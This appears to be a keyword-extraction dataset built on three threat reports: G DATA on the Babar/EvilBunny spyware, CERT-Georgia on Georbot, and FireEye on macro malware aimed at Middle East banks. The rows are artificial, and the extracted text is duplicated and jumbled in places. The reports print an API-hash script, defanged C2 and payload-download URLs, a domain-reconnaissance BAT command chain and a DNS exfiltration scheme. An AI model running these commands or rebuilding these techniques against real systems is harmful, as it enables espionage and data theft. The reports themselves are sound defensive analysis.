2.018Chapter 6 Special clues1. PDB pathPDB1 url ","{'phrases': ['HWP document', 'documents', 'vulnerability', 'OnionDog', 'Malware', 'USB Worms', 'data', 'backdoors'], 'target': 'HWP document; documents; vulnerability; OnionDog; Malware; USB Worms; data; backdoors.'}"
the malware; employees; the Babar malware; SHA256; files; the shellcode; metadata; clipboard logging; audio; the elephant; big ears; data; the malware; a command; control; the attackers; commands; the victim; the attacker; the malware; control; persistence; tools; the attacker; the network.,"[' 1. Babar is likely spread through targeted spear-phishing emails to infect specific victims. 2. Once executed, it establishes command and control communication to receive instructions. 3. It exfiltrates keystrokes, screenshots, clipboard contents, and audio recordings to the C&C server. 4. The malware can also receive and execute further modules for expanded access. 5. The attackers use this access to silently monitor the target and steal sensitive data over a period of time. 6. Babar evades detection to operate as a long-term spying tool on compromised systems. ']","Extract the keywords: G DATA Security Blog Security Blog02/18/2015 | Bochum, Author: Paul RascagnèresBabar: espionage software ﬁnally found  and put under the microscopeG DATA experts analyze malware mentioned in CSEC documents leaked by SnowdenAlmost a year after Operation SNOWGLOBE was publicly mentioned for the ﬁrst time by the  Almost a year after Operation SNOWGLOBE was publicly mentioned for the ﬁrst time by the  famous French newspaper Le Monde, security experts have now laid hands on malware famous French newspaper Le Monde, security experts have now laid hands on malware samples that match the descriptions made by the Communication Security Establishment samples that match the descriptions made by the Communication Security Establishment Canada (CSEC). The following analysis is the ﬁrst report about the espionage malware  Canada (CSEC). The following analysis is the ﬁrst report about the espionage malware  dubbed Babar, which the whole computer security community searched for. After the dubbed Babar, which the whole computer security community searched for. After the disclosure about EvilBunny [1], Babar is now a second component identiﬁed to be related to  disclosure about EvilBunny [1], Babar is now a second component identiﬁed to be related to  Operation SNOWGLOBE and is believed to be coded by the same developers. Babar’s feature Operation SNOWGLOBE and is believed to be coded by the same developers. Babar’s feature set includes keystroke logging, clipboard logging and, most interesting, the possibility to log set includes keystroke logging, clipboard logging and, most interesting, the possibility to log audio conversations – the elephant has big ears! audio conversations – the elephant has big ears!BackgroundThe revelation about the existence of yet another potentially nation-state driven spyware occurred in March 2014 when Le Monde ﬁrst published information  about top secret slides originating from 2011 and part of their content . But the slides Le Monde published revealed only a small part of the picture – several slides were cut out, some information was redacted. Germany’s Der Spiegel re-published the slide set with far less deletions recently, in January 2015, and therefore gave a deeper insight about what CSEC actually says they have tracked down. The newly published documents reveal: the so called operation SNOWGLOBE, was discovered in 2009 (slide 9) and consists of three different “implants”, two were dubbed snowballs and one “more sophisticated implant, discovered in mid-2010” is tagged as snowman (slide 7). According to slide 22, “CSEC assesses, with moderate certainty, SNOWGLOBE to be a state-sponsored CNO [Cyber Network Operation] effort, put forth by a French intelligence agency.” The information given dates back to 2011 and nothing else has been published since. Now that speciﬁc Babar samples have been identiﬁed and analyzed,   there might be new information, also with regards to similarities or differences between the two Remote Administration Tools (RATs) EvilBunny and Babar. We’d like to express special thanks to Marion Marschalek, Joan Calvet and the CIRCL Luxemburg team for their contributions for this report! We recommend reading Marion’s report “Shooting Elephants”, a complementary piece of work regarding the Babar malware.The samplesEvilBunny-Samples (SHA256)EvilBunny-Samples (SHA256) Babar-Samples (SHA256, Dropper and Payload) G DATA’s security solutions detect all analyzed samples. The malware names: are the coders cartoonists? Looking at the compilation path stored in the binary, we can identify the internal name of the projects: C:\Users\user\Desktop\bunny 2.3.2\Release\Transporter2.pdb C:\Documents and Settings\admin\Desktop\Babar64\Babar64\obj\DllWrapper Release\Release.pdb Furthermore, a command and control server of an EvilBunny sample also mentioned the Identifying the malware described in CSEC slides The following indicators underline the assumption that the EvilBunny and Babar samples analyzed match the ones described in the leaked Snowden documents, in the order of the slides. Nevertheless, some differences are listed at the end: Match: Typographical error – slide 8 CSEC mentioned a typo, committed by the malware authors. In the user agent, instead of using the string MSIE (MicroSoft Internet Explorer), the malware uses the string MSI. The malware does not use the browser to communicate; the request was inserted manually by the developer who made a mistake. We found this exact same mistake in EvilBunny and Babar samples:paul@gdata:~/babar$ strings -a perf_585.dll | grep ""MSI "" User-Agent: Mozilla/4.0 (compatible; MSI 6.0; Windows NT 5.1; .NET CLR 1.0.3705; .N ET CLR 1.1.4322) User-Agent: Mozilla/4.0 (compatible; MSI 6.0; Windows NT 5.1; .NET CLR 1.0.3705; .N ET CLR 1.1.4322)CSEC Operation SNOWGLOBE, slide #8, discovered by Edward Snowden - Click to enlargeMatch: Internal name: Babar – slide 18 Within the documents leaked by Snowden, the CSEC mentioned the internal name of the malware: Babar. In the malware samples analyzed the internal name is the same, as mentioned before.CSEC Operation SNOWGLOBE, slide #18, discovered by Edward Snowden - Click to enlarge Match: Locale option – slide 19 The CSEC mentioned the locale option “fr_FR EvilBunny samples, during the HTTP queries to the command and control servers the Accept- Language parameter is set to “frfr”.fr_FR” during the spear-phishing attack. In theCSEC Operation SNOWGLOBE, slide #19, discovered by Edward Snowden - Click to enlarge Match: English language – slide 19 Also on the slide 19, the CSEC mentioned that the command and control interface is in English but the choice of words is not typical for a native English speaker. We found English mistakes in EvilBunny and Babar samples, such as this example from Babar: !!!EXTRACT ERROR!!!File Does Not Exists-->[%s] Difference: Infrastructure – slide 10 The CSEC documents reveal that scripts called “outbase.php on infrastructure domains, “in a directory under root domain”. The scripts found in the samples analyzed were named “index.php Difference: Developer username: titi – slide 18 The developer’s username in the Babar samples analyzed is admin instead of titi as mentioned in the Snowden documents. The Bunny samples reveal user as the developer’s username.index.php” in a deeper directory.Comparing EvilBunny to Babaroutbase.php“ and “register.phpregister.php” were foundWe believe that both malware species belong to the mentioned operation SNOWGLOBE and the following chapter will describe similarities and differences: Typing error As mentioned previously, a typo has been found within EvilBunny and Babar, within the user agent string. This mistake can be the result of a copy/paste error or due to the use of the same library inside the two samples. Antivirus detection The ﬁrst task for both, EvilBunny and Babar, is to list the installed antivirus software. They use The ﬁrst task for both, EvilBunny and Babar, is to list the installed antivirus software. They use  the exact same technique to fulﬁll this task: WMI, the Windows Management Instrumentation.  WMI is an interface provided by Microsoft to get information about and notiﬁcations from the  system. The users can use WMI by using VBScript, PowerShell or C++ language. To detect the name of the antivirus solution installed and registered, the malware opens one of the following Windows Security Center WMI providers:ROOT\SecurityCenter ROOT\SecurityCenter (for operating systems before Windows Vista) ROOT\SecurityCenter2 ROOT\SecurityCenter2 (Windows Vista and newer OS)The analyzed malware includes the two providers and the two versions of operating system (pre-Vista and post-Vista). Microsoft provides an SQL-like system to perform queries using the WMI. This system is called WMI Query Language (short WQL). The malware performs the following query:SELECT * FROM AntiVirusProduct Here is the description of the antivirus object:class AntiVirusProduct { string companyName; // Vendor name string displayNam; // Application name string instanceGuid; // Unique identifier boolean onAccessScanningEnabled; // Real-time protection boolean productUptoDate; // Definition state string versionNumber; // Application version }versionNumber and theproductUpToDate, versionNumberThe malware checks the following entries: productUpToDate displayName displayName. The malware checks whether the SHA-256 of the ﬁrst word of the  displayName displayName is equal to a predeﬁned list. Looking at several samples, the content of this list varies. Here is  one example of a list [Updated on February 19, 2015): The identiﬁed hashes correspond to the strings of well-known commercial antivirus products.  The hash (G) stands for G DATA software solutions. The hashes mentioned before the empty brackets have not yet been identiﬁed.  The two malicious programs both use API obfuscation in order to make the analysis more complicated. The purpose is to execute a Microsoft Windows API without naming it. On our cases, the approach is the same in both malware families: when the malware needs to execute an external function (from a dynamic library), it uses a kind of “hash” instead of using the function name. The “hash” is provided to an internal function, this function establishes the relation between the “hash” and the address of the function. At the end, the address is executed. The only difference between EvilBunny and Babar, when it comes to API obfuscation, is the internal function used to establish the relation. An example below (where the “hash” is 0x46318AD1):EvilBunny case: On EvilBunny samples, the malware realized a kind of Cyclic Redundancy Check (short CRC) of every exported function name of the desired dynamic library. If the “CRC” of a function’s name matches the value of the “hash”, the malware knows that it is the function to be executed. Here is the “CRC” loop:This loop can be represented by the following python script:#!/usr/bin/python for i in list(function) key = rol32 (CRC, 7) CRC = ord(i)^key print function+”: 0x%08x” % (CRC) Here is the output of the script:CreateProcessW: 0x46318ad1The hexadecimal value is the same as the value in our screenshot, so the executed function will be CreateProcessW() the hexadecimal value for each and every function available in the library kernel32.dll kernel32.dll:CreateProcessW(). With this script, we can easily create a correlation table to generatepaul@gdata:~/$ cat API.py #!/usr/bin/python import sys import pefiledef rol32 (num, count): num1 = (num << count) & 0xFFFFFFFF num2 = (num >> (0x20 - count)) & 0xFFFFFFFF return num1 | num2pe = pefile.PE(sys.argv[1]) for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols: cpt = 0 for i in list(exp.name): key = rol32(cpt,7) cpt=ord(i)^key print exp.name+"": 0x%08x"" % (cpt)paul@gdata:~/babar$ ./API.py kernel32.dll The Babar malware does not perform a kind of “CRC” regarding the function name. The algorithm is more complex. However, the philosophy is the same: for each exported function name, the malware applies an algorithm in order to verify if the calculated “hash” matches the wanted “hash”. To create the correlation table in this case, our approach was to instrument the debugger using Python. On our samples, the instruction at 0x10040930 (CMP ECX, [EAX] CMP ECX, [EAX]) is really interesting because ECXcontains the desired “hash”, [EAX] contains the calculated “hash” of the current exported function and ﬁnally [EBX] contains the current exported function name. So  we can create a short Immunity Debugger Python script to calculate these values for each exported function name and create the table:from immlib import * from immutils import * def main(args): imm = Debugger() imm.setBreakpoint(0x10040930) imm.run()while True: regs=imm.getRegs() fct = imm.readString(regs['EBX']) value = imm.readMemory(regs['EAX'], 4)[::-1] imm.log(fct+"":""+value.encode('hex')) imm.run() And the output:AcquireSRWLockExclusive:333bab35 …If you are interested in the complete correlation tables, please contact us at intelligence@gdata.de Babar conﬁguration extraction and analysis  The conﬁguration of the malware is encrypted with the AES algorithm. The key and the offset  where the conﬁguration is stored are located at the end of the Babar payloads (the .dll ﬁles).   Once decrypted, we can identify the following content, which reveals information about command and control servers as well as certain process names and ﬁle name extensions the  malware will keep an eye on: .exe txt, rtf, xls, xlsx, ppt, ppts, doc, docx, pdf, vsd skype.exe, msnmsgr.exe, oovoo.exe, nimbuzz.exe, googletalk.exe, yahoomessenger.exe, x-lite.exe hxxp://www.alexpetro.com/images/training/courses/bb212/index.php hxxp://www.etehadyie.ir/images/public/bb212/index.php .exe txt, rtf, xls, xlsx, ppt, ppts, doc, docx, pdf, vsd skype.exe, msnmsgr.exe, oovoo.exe, nimbuzz.exe, googletalk.exe, yahoomessenger.exe, x-lite.exe hxxp://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php hxxp://www.gezelimmi.com/wp-includes/misc/bb/index.phpThe ﬁrst line contains document viewer processes, the second line contains media document  extensions and the third line contains instant messaging processes. The use of thisinformation will be described below in the chapter Babar’s spy features. Finally, the last line contains the URLs of the command and control servers. The following information is available at the time of writing this article:www.alexpetro.comWebsite topic: Service company for drilling equipment (oil and gas), located in Egypt Domain registrant's origin: - Website hosted in: Texas, USAwww.etehadyie.ir (not available during investigation)Website topic: Home appliances (according to Google translator) Domain registrant's origin: Tehran, Iran Website hosted in: -www.horizons-tourisme.comWebsite topic: travel agency, located in Algeria Domain registrant's origin: Algiers, Algeria Website hosted in: Ohio, USAwww.gezelimmi.com (not available during investigation)Website topic: Turkish website to promote tourism in Turkey Domain registrant's origin: Merkez, Turkey Website hosted in: New York, USAWe do not know whether the command and controls were compromised legitimate websites, during the campaign, or servers dedicated to the attacks. Slide 23 mentions that C&C nodes were found “worldwide (including Canada, US, UK)”. Babar’s espionage features The RAT has common features such as code execution, code injection into running processes, ﬁle stealing (the extensions listed in the conﬁguration ﬁle come into play at this pint). However,    Babar has additional features such as being a key logger in order to record key strokes and it also has the possibility to steal the clipboard content (frequently used to store passwords in case the user uses password storage application such as KeePass ﬁle  %COMMON_APPDATA%\MSI\update.msi API:%COMMON_APPDATA%\MSI\update.msi. Here are two screenshots of the key loggerKeePass). The data is stored in theAnd the following is a snippet of the clipboard stealer API:Babar is also able to take screenshots of the infected desktop (thanks to the GdiPlus API). Here is a snippet of the GdiPlus API:dsound and winmmAnd ﬁnally, as every elephant, Babar has big ears and the malware is able to listen to  conversations and log them by using the dsound winmm libraries. We assume that the process list of the instant messaging services, seen in the conﬁguration, is used to identify  when the malware should enable this feature. The following screenshot shows the use of the wave* wave* API to record the audio ﬂow:  Looking at the feature list, we can identify that this malware is meant to be a pure espionage tool. It is, regarding the current information, not harming the computer system itself but represents an elaborate instrument to function as wiretap and to exﬁltrated data from  computers infected. This leads to the assumption that the number of infected machines is rather small and chosen.ConclusionAfter having more information about the malware attributed to operation SNOWGLOBE, taken from the re-published slides, the G DATA experts are sure to have found samples which match the descriptions. EvilBunny and Babar might correspond to two of the three “implants” mentioned as Snowballs and Snowman. The G DATA SecurityLabs are convinced that the number of similarities identiﬁed between  EvilBunny and Babar show that both malware families originate from the same developers. The evil cartoon malware families share part of their code. The analyses suggest that the samples identiﬁed are newer versions of the malware CSEC described in the slides. This may  be one reason for the absence of certain indications CSEC has mentioned. Nevertheless, unfortunately, the experts cannot contribute further information with regards to the malware’s origin nor the list of victims. The information CSEC provided was partly supported by indications found in the code, but no clue has been identiﬁed. The assertion of a  “French intelligence community” being responsible remains unchanged. Attributing malware to any origin, especially when dealing with specialized and professional malware, has always been difﬁcult.   With a possible nation-state background, this espionage software would not be spread as mass malware but activated against speciﬁc and chosen targets only. The main functions of  this malware are data exﬁltration and wiretapping.  Even if many questions still remain unanswered, the analyses present mark an important step towards the validation of the slides leaked. Links to the articel: Marion Marschalek's report about EvilBunnyMalware Microsoft Windows Vulnerabilities Security products CyberCrimeBackShare this articleRelated articles:03/06/2015 Casper: der neueste Spross der Cartoon Malware Familie Casper gilt als Nachfolger von EvilBunny und Babar und stammt vermutlich aus der Feder derselben 03/06/2015 Casper: the newest member of the cartoon malware family Casper is considered to be EvilBunny’s and Babar’s successor, believed to be originating from the same group G DATA | Trust in German SicherheitCookies on the G DATA website: Cookies on the G DATA website: Cookies help us provide services for you in the best possible way. We use cookies to improve your user experience, to present products that might be of interest to you and to store content in your shopping cart. Please continue if you agree to this or read more about this in our© 2018 G DATA Software AG. All rights reserved.Data Protection Declaration.ContactImprint ","{'phrases': ['Babar', 'victims', 'command', 'control', 'communication', 'RAT', 'screenshots', 'content', 'C&C', 'the malware', 'exp', 'time', 'detection'], 'target': 'Babar; victims; command; control; communication; RAT; screenshots; content; C&C; the malware; exp; time; detection.'}"
Georgian Government; news pages; VBS; documents; Steal; certificates; Word; remote server; Execution; espionage; arbitrary commands; the infected system; Commands; the attacker; files; the webcam; audio recording; screenshots; the network; the malware; Detection; detection.,"["" 1. Attackers injected malicious scripts into legitimate Georgian news websites. 2. The scripts redirected visitors to pages containing exploit code to download malware. 3. The malware (calc.exe) executed a drive-by download on the victim's computer. 4. Calc.exe injected code into Explorer.exe to maintain persistence, creating a file called usbserv.exe. 5. Usbserv.exe communicated with hacked Georgian websites to retrieve C2 server addresses. 6. The malware connected to C2 servers to receive commands and exfiltrate data. 7. The malware searched for sensitive keywords in documents and recorded audio/video. 8. Stolen documents were uploaded to C2 servers. 9. The C2 servers changed IP addresses and hosting countries frequently. 10. The malware evolved its capabilities over time to evade detection. 11. Links were found between the malware/C2 and Russian cybercriminal/intelligence groups. ""]","Extract the keywords: CYBER ESPIONAGEAgainst Georgian Government(Georbot Botnet)CERT.GOV.GELEPL Data Exchange AgencyMinistry of Justice of Georgia1 | P a g eSummaryIn march, 2011 CERT-Georgia which is Governmental “Computer Emergency Response Team” of Republic of Georgia has Discovered Cyber Attack Incident, which seems to be Cyber Espionage Example.Advanced Malicious Software was Collecting Sensitive, Confidential Information about Georgian and American Security Documents and then uploading it to some of Command and Control Servers. (which changes often upon detection).After investigating Attackers Servers and Malicious Files, we have linked this Cyber Attack to Russian Official Security Agencies.2 | P a g eAfter Analysing Webserver, Malicious Files and Various Scripts we found out that:1. Some of the Georgian NEWS-related sites were Hacked.(The Malicious script was injected only in the pages, where SPECIFIC information was presented)2. After visiting this pages Computer was infected by Unknown MaliciousProgram.(None of Antivirus Product could Identify the threat, by the time of discovery).3. When executed, Malicious File Fully Controls Infected Computers. 4. Searches for the “Sensitive words” into the Document Files. 5. Makes Video and Audio Capture using built-in camera and microphone.3 | P a g eTargeted AudienceCyber Attack was designed very smartly. Various Georgian News-Related web-sites were hacked and modified only Specific News pages (eg. NATO delegation Visit in Georgia, US- Georgian Agreements and Meetings, Georgian Military NEWS).Only the persons who was interested in such information were infected with this Advanced Threat, despite of Security Defensive measure’s and Software used on targets Computer and Network Systems. Threat was highly encrypted and used contemporary stealthy techniques, so that none of security tools could identify it.www.caucasustimes.com – Site about NEWS from Caucasian Region www.cei.ge – Caucasus Energy and Infrastructure www.psnews.ge - Georgian NEWS Site ema.gov.ge www.opentext.ge www.presa.ge www.presage.tv www.psnews.info www.resonancedaily.com4 | P a g eMalware CapabilitiesFully Controls infected computer.Malicious file was searching for Sensitive WORDS inside MS Office and PDF documents. Send any file from the local hard drive to the remote server• Steal certificates • Search the hard drive for Microsoft Word documents (sensitive words) • Search the hard drive for remote desktop configuration files, pbk files • Take screenshots • Record audio using the microphone • Record video using the webcam • Scan the local network to identify other hosts on the same network • Execute arbitrary commands on the infected system5 | P a g eSensitive WordsIn The Final Steps Cyber Attacker Steals Matched files, uploads them to the Server.6 | P a g eCommand & Controll ServersSeptember, 2010 – georgiaonline.xp3.biz (United States) FreeWebHostingArea.com 70% of them from Georgia 5% from the United States 4% - Canada, Ukraine, France, China Example of infected Computer from United States8 | P a g eMalicious file was evolving and Developed time to time:30 March, 2011 – Virus Steals Sensitive Documents, Certificates14 September 2011 – Changed Infection Mechanism, new Bypassing methods for the (Antivirus/Firewall/IDS)25 November 2011 – Virus is more encrypted and obfuscated. infects windows 7 Operating System12 December 2011 – added Video Recording capability, scanning and infecting computers through the Network, changed Spreading vectorIt had been evolved from 2.1 version to 5.5.9 | P a g eINFECTING MECHANISM1) Injected script or iframe into Legitimate Web-site 2) Frame.php from iframe – contained (exploit pack) 3) Drive-By Download & Execution of calc.exe 4) Calc.exe self-destruction injecting code into Explorer.exe 5) Creating persistant usbserv.exe virusStep 1- injected script10 | P a g eshellcode inside frame.php / exploit pack files11 | P a g e1) We found out that there is crafted and obfuscated frame.php file, which carries some exploit codeand redirects users to other exploit pages: It uses CVE-2010-0842, CVE-2006-3730, MS06-057 and other unknown vulnerabilities.2) Exploit code used in frame.php is crypted version of TrojanDownloader:JS/SetSlice, which exploitsMS06-057 Vulnerability by using 'WebViewFolderIcon' ActiveX control (Web View).3) Also there was some 0day exploit used for exploitation through PDF, JAR files.Malicious Files Not detected with Major Antivirus Products (1/47 Virustoal, Dr.Web result – suspicious) Bypasses Windows 7 sp1 patched with Firewall enabled. As of 25.03.2011, 20.06.2011, 16.01.2012, 25.03.2012 After Executing Malware does 3 major things: - Before installing bot checks if the computer is located in UTC+3, UTC+4 - injects itself into iexplorer.exe and communicating to defaced sites, for C&C address retrival - creating usbserv.exe bot writing it to autorun in Windows Registry.directory,file12 | P a g eBot Control Mechanism1) C&C servers Addresses are written into Malware’s Binary file 2) If all of them are unreachable malware reads special html page header, is html page defaced on, one of the Georgianwhich actually Governmental Web-Site:13 | P a g eNEW METHOD OF MALWARE UPDATINGNew version of Malware file is downloaded as base64 encoded plain text from different servers simultaneously and then assembled into one file.14 | P a g eUnique Characteristics1) Searching Sensitive word’s In filenames and INTO pdf, word, xls, txt, rtf, ppt Documents.2) Recording Videos from Webcam : During skype conversation, live streaming capability3) Modify malware code file from C&C Web Panel4) Self-Created Packer, Crypter in Assembler Language (evading A/V)5) Update mechanism, Base-encoded plaintext, simultaneously from different C&C servers. (evading IPS/IDS)6) opening network socket at ring0 level (evading firewall) / TDSS Rootkit Modification15 | P a g eInfected OrganisationsMost Georgian Infected computers were from our Governmental Agencies andCritical Information InfrastructuresTargets:1) Ministries2) Parliament3) Critical Information Ifrastructures4) Banks5) NGO’s16 | P a g eResponding Steps1) Blocked each of 6 C&C IP addresses, upon detection, through Country’s 3 main Internet Service Providers. (Immediate Response)2) CERT-GOV-GE identified all Georgian infected IP’s and gave mitigation strategies and cleaning tools to Infected Agencies and Institutions.3) Cooperated with Antivirus, IDS/IPS solutions, to create mitigating tools and signatures. (Microsoft, Eset, Snort, Cisco, various Blacklists, Blocklists)4) Cooperated with FBI, Department of Homeland Security, US Secret Service, US- CERT, Governmental-CERT-Germany, CERT-Ukraine, CERT-Polska, Microsoft Cybersecurity Division5) Hosting Providers Abuse Teams, to shut down attacking servers.6) Law Enforcement Agencies to obtain log files and system images for Forensic Analysis.17 | P a g eCounter Cyber-Intelligence (unmasking the attackers) CERT-GOV-GE gained full access to Command and Control servers, Decrypted communication mechanisms and malicious files. After Analyzing all the gathered information we have identified Cyber attacker persons and organizations. “During 2008 Cyber War between Russia and Georgia, two Independent US-based Organizations linked Cyber Attackers with Russian Official Ministries and Organizations.“United States Cyber Consequences Unit” and “Project Grey Goose”Jefrey Carr, GreyLogic (cyber Intelligence services for Government Sector) Sanjay Goel, New York State Center for Information Forensics and Assurance Mike Himley, CEO/President of Eagle Intelligence They investigated entire Cyber Attack against Georgia and linked 2008 Cyber Attacks with so-called Cyber-Criminals Group “Russian Business Network”,They had reported, that Some of used Internet Resources and Credentials belonged with “Russian Ministry of Defense Research Institute” called – Center for Research of Military Strength of Foreign Countries.”In 2011-2012, During This New Cyber Espionage Attack, we have identified Russian Security agencies, once again.18 | P a g eWe have found: 3 main facts, which indicate to Russian Official State organizations.Warynews.ru – site used to control infected Georgian computers – IP and DNS servers belonges to Russian Business Network. (mentioned in various Blacklist, Bad Reputation)www.rbc.ru – written directly into MALWARE code, to communicate with Attackers if every communication channel is closed. Official name “Russian Business Consalting” – official communication technologies and technical protection of information;Next to it: Federal Security Service of the Russian Federation (FSB) – MoscowIn March 2012, Company ESET Security Published Report named“Georbot: From Russia With Love” (with support of our CERT Team)After That Russian NEWS Agencies Spread Disinformation Based on ESET’s Report Blaming Georgian Governmental website (which actionly was hacked) for serving malicious files. But there where nothing said about REAL 6 Command & Controll Servers which were hosted in various countries and mentioned in ESET’s Report.21 | P a g eWe have Infected our PC from Lab, then gave Cyber Attacker Fake ZIP Archive with his own virus inside and the name “Georgian-Nato Agreement”.Attacker Stole that archive and executed malicious files.As we had access to BOT Panel, we had maintained control over his PC.Then captured got video of him, personally. We have captured process of creating new malicious modules.We have Obtained Russian Document, from email, where he was giving someone instructions how to use this malicious software and how to infect targets.We have linked him with some of German and Russian hackers.Then we have Obtained information about his destination City, Internet Service Provider, Email and etc.22 | P a g e23 | P a g eDisassembly Process in OllyDbg.24 | P a g eNickname: ESHKINKOT – Inside Malware ExecutableSame MAIL Address, City in Russia25 | P a g eOn Russian Xakep Forum, Seeking help for Exploit DevelopmentHis Internet Service Provide, City26 | P a g eInformation About This Incident was Presented at Various Events &Conferences.1) SSECI 2012 (Safety, Security and Efficiency of Critical Infrastructures) –Prague, Czech Republic 30 may – 01 June 2012 (with support of ONRG – Office of Naval Research Global)2) Symposium on Cyber Incidents and Critical Infrastructure Protection –3) NATO – Science for Peace and Security (SPS) - METU - Middle East Technical UniversityTallin, Estonia 18-19 June 2012Georgian Cyber Cases for Afghan IT Specialists - Ankara, Turkey 21 May - 01 Jun 201227 | P a g e ","{'phrases': ['Attackers', 'eg', 'Georgian', 'NEWS', 'site', 'pages', 'exploit code', 'Download', 'MALWARE', 'Calc.exe', 'Computer', 'Explorer.exe', 'Usbserv.exe', 'commands', 'word', 'documents', 'video', 'IP addresses', '10', 'time', 'detection', '11', 'Russian', 'Cyber', 'Intelligence'], 'target': 'Attackers; eg; Georgian; NEWS; site; pages; exploit code; Download; MALWARE; Calc.exe; Computer; Explorer.exe; Usbserv.exe; commands; word; documents; video; IP addresses; 10; time; detection; 11; Russian; Cyber; Intelligence.'}"
the attackers; emails; Excel; macros; the victim; the macro; a scheduled task; GoogleUpdateTaskMachineUI; screenshot; information; the BAT file; information; the results; a file; the macro.,"[""1. The attacker sends emails with Excel docs containing malicious macros to bank employees. 2. The macro extracts and decodes base64 content from the Excel sheet. 3. The decoded content is dropped as a VBScript and PowerShell script on the system. 4. The macro creates a scheduled task to repeatedly execute the VBScript. 5. The VBScript uses PowerShell to download tools like Mimikatz and a custom BAT script. 6. The BAT script gathers system information like accounts, processes, etc. 7. The VBScript exfiltrates the data by encoding it in DNS subdomain names. 8. The macro unhides additional benign content in the Excel sheet after executing. 9. The multistage attack allows the attacker to gather intelligence on the bank's systems. ""]","Extract the keywords: MenuMay 22, 2016 | by Sudeep Singh, Yin Hong Chang | Threat Research, Targeted AttackIn the first week of May 2016, FireEye’s DTI identified a wave of emails containing malicious attachments being sent to multiple banks in the Middle East region. The threat actors appear to be performing initial reconnaissance against would-be targets, and the attacks caught our attention since they were using unique scripts not commonly seen in crimeware campaigns.In this blog we discuss in detail the tools, tactics, techniques and procedures (TTPs) used in these targeted attacks.The attackers sent multiple emails containing macro-enabled XLS files to employees working in the banking sector in the Middle East. The themes of the messages used in the attacks are related to IT Infrastructure such as a log of Server Status Report or a list of Cisco Iron Port Appliance details. In one case, the content of the email appeared to be a legitimate email conversation between several employees, even containing contact details of employees from several banks. This email was then forwarded to several people, with the malicious Excel file attached.The macro first calls an Init() function (shown in Figure 1) that performs the following malicious activities:1. Extracts base64-encoded content from the cells within a worksheet titled ""Incompatible"". 2. Checks for the presence of a file at the path %PUBLIC%\Libraries\ update.vbs. If the file is not present, themacro creates three different directories under %PUBLIC%\Libraries, namely up, dn, and tp.3. The extracted content from step one is decoded using PowerShell and dropped into two different files:%PUBLIC%\Libraries\update.vbs and %PUBLIC%\Libraries\dns.ps14. The macro then creates a scheduled task with name: GoogleUpdateTaskMachineUI, which executesupdate.vbs every three minutes.Note: Due to the use of a hardcoded environment variable %PUBLIC% in the macro code, the macro will only run successfully on Windows Vista and subsequent versions of the operating system.Figure 1: Macro Init() subroutineOne of the interesting techniques we observed in this attack was the display of additional content after the macro executed successfully. This was done for the purpose of social engineering – specifically, to convince the victim that enabling the macro did in fact result in the “unhiding” of additional spreadsheet data.Office documents containing malicious macros are commonly used in crimeware campaigns. Because default Office settings typically require user action in order for macros to run, attackers may convince victims to enable risky macro code by telling them that the macro is required to view “protected content.”In crimeware campaigns, we usually observe that no additional content is displayed after enabling the macros. However, in this case, attackers took the extra step to actually hide and unhide worksheets when the macro is enabled to allay any suspicion. A screenshot of the worksheet before and after running the macro is shown in Figure 2 and Figure 3, respectively.Figure 2: Before unhiding of contentFigure 3: After unhiding of contentIn the following code section, we can see that the subroutine ShowHideSheets() is called after the Init() subroutine executes completely:Private Sub Workbook_Open() End SubThe code of subroutine ShowHideSheets(), which unhides the content after completion of malicious activities, is shown in Figure 4.Figure 4: Macro used to unhide content at runtimeAfter the macro successfully creates the scheduled task, the dropped VBScript, update.vbs (Figure 5), will be launched every three minutes. This VBScript performs the following operations:1. Leverages PowerShell to download content from the URI hxxp://go0gIe[.]com/sysupdate.aspx?req=xxx\dwn&m=d and saves it in the directory %PUBLIC%\Libraries\dn.2. Uses PowerShell to download a BAT file from the URI hxxp://go0gIe[.]com/sysupdate.aspx?req=xxx\bat&m=d and saves it in the directory %PUBLIC%\Libraries\dn. 3. Executes the BAT file and stores the results in a file in the path %PUBLIC%\Libraries\up. 4. Uploads this file to the server by sending an HTTP POST request to the URIhxxp://go0gIe[.]com/sysupdate.aspx?req=xxx\upl&m=u.5. Finally, it executes the PowerShell script dns.ps1, which is used for the purpose of data exfiltration using DNS.Figure 5: Content of update.vbsDuring our analysis, the VBScript downloaded a customized version of Mimikatz in the previously mentioned step one. The customized version uses its own default prompt string as well as its own console title, as shown in Figure 6.Figure 6: Custom version of Mimikatz used to extract user password hashesSimilarly, the contents of the BAT file downloaded in step two are shown in Figure 7:whoami & hostname & ipconfig /all & net user /domain 2>&1 & net group /domain 2>&1 & net group ""domain admins"" /domain 2>&1 & net group ""Exchange Trusted Subsystem"" /domain 2>&1 & net accounts /domain 2>&1 & net user 2>&1 & net localgroup administrators 2>&1 & netstat -an 2>&1 & tasklist 2>&1 & sc query 2>&1 & systeminfo 2>&1 & reg query ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"" 2>&1Figure 7: Content of downloaded BAT scriptThis BAT file is used to collect important information from the system, including the currently logged on user, the hostname, network configuration data, user and group accounts, local and domain administrator accounts, running processes, and other data.Another interesting technique leveraged by this malware was the use of DNS queries as a data exfiltration channel.This was likely done because DNS is required for normal network operations. The DNS protocol is unlikely to be blocked (allowing free communications out of the network) and its use is unlikely to raise suspicion among network defenders.The script dns.ps1, dropped by the macro, is used for this purpose. In the following section, we describe its functionality in detail.1. The script requests an ID (through the DNS protocol) from go0gIe[.]com. This ID will then be saved into thePowerShell script.2. Next, the script queries the C2 server for additional instructions. If no further actions are requested, the script exitsand will be activated again the next time update.vbs is called.3. If an action is required, the DNS server replies with an IP with the pattern 33.33.xx.yy. The script thenproceeds to create a file at %PUBLIC%\Libraries\tp\chr(xx)chr(yy).bat. The script then proceeds to make DNS requests to fetch more data. Each DNS request results in the C2 server returning an IP address. Each octet of the IP address is interpreted as the decimal representation of an ASCII character; for example, the decimal number 99 is equivalent to the ASCII character ‘c’. The characters represented by the octets of the IP address are appended to the batch file to construct a script. The C2 server signals the end of the data stream by formats being generated by the script.Figure 8: Code Snippet of dns.ps1Format of subdomains used in DNS C2 protocol:[00][botid]00000[base36 random number]30[00] [botid]00000[base36 random number]232A[hex_filename] [i-counter][00][botid][cmdid][partid][base36 random number][48-hex- char-of-file-content]Subdomain used to request for BotID, used in step 2 aboveSubdomain used while performing file transfers used in step 3 aboveSubdomain used while performing file upload, used in step 5 aboveTable 1: C2 Protocol FormatAlthough this attack did not leverage any zero-days or other advanced techniques, it was interesting to see how attackers used different components to perform reconnaissance activities on a specific target.This attack also demonstrates that macro malware is effective even today. Users can protect themselves from such attacks by disabling Office 